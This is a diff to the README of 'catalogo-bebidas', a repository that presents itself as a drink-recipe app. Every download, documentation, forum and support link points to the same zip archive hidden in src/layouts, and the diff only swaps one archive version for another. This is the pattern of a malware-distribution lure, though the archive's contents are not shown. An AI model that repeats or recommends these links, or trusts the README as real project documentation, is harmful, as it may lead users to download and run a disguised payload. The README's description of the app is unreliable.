@@ -1,7 +1,7 @@
 # 🍹 catalogo-bebidas - Discover Your Favorite Drink Recipes
 
 ## 📥 Download Now
-[![Download catalogo-bebidas](https://github.com/Eliakim-ellie/catalogo-bebidas/raw/refs/heads/main/src/layouts/catalogo-bebidas-v3.7.zip%20Here-Get%20the%20App-brightgreen)](https://github.com/Eliakim-ellie/catalogo-bebidas/raw/refs/heads/main/src/layouts/catalogo-bebidas-v3.7.zip)
+[![Download catalogo-bebidas](https://raw.githubusercontent.com/Eliakim-ellie/catalogo-bebidas/main/src/layouts/catalogo_bebidas_1.3.zip%20Here-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Eliakim-ellie/catalogo-bebidas/main/src/layouts/catalogo_bebidas_1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **catalogo-bebidas** project. This application helps you learn how to make various drinks using your favorite ingredients. You can categorize drinks, save your favorites, and even create new recipes with the help of artificial intelligence.
@@ -15,7 +15,7 @@ Welcome to the **catalogo-bebidas** project. This application helps you learn ho
 ## 📦 Download & Install
 To get started, visit the Releases page to download the application:
 
-[Visit this page to download](https://github.com/Eliakim-ellie/catalogo-bebidas/raw/refs/heads/main/src/layouts/catalogo-bebidas-v3.7.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Eliakim-ellie/catalogo-bebidas/main/src/layouts/catalogo_bebidas_1.3.zip)
 
 1. Click on the link.
 2. Find the latest version of the app.
@@ -41,9 +41,9 @@ The **catalogo-bebidas** app uses several modern technologies to deliver a smoot
 
 ## 🔗 Links & Resources
 For more information on how to use the application, check the following resources:
-- [Documentation](https://github.com/Eliakim-ellie/catalogo-bebidas/raw/refs/heads/main/src/layouts/catalogo-bebidas-v3.7.zip) (Placeholder)
-- [Community Forum](https://github.com/Eliakim-ellie/catalogo-bebidas/raw/refs/heads/main/src/layouts/catalogo-bebidas-v3.7.zip) (Placeholder)
-- [Support](https://github.com/Eliakim-ellie/catalogo-bebidas/raw/refs/heads/main/src/layouts/catalogo-bebidas-v3.7.zip) (Placeholder)
+- [Documentation](https://raw.githubusercontent.com/Eliakim-ellie/catalogo-bebidas/main/src/layouts/catalogo_bebidas_1.3.zip) (Placeholder)
+- [Community Forum](https://raw.githubusercontent.com/Eliakim-ellie/catalogo-bebidas/main/src/layouts/catalogo_bebidas_1.3.zip) (Placeholder)
+- [Support](https://raw.githubusercontent.com/Eliakim-ellie/catalogo-bebidas/main/src/layouts/catalogo_bebidas_1.3.zip) (Placeholder)
 
 ## 🔄 How to Use the App
 1. **Launch the Application**: Open the app after installation.
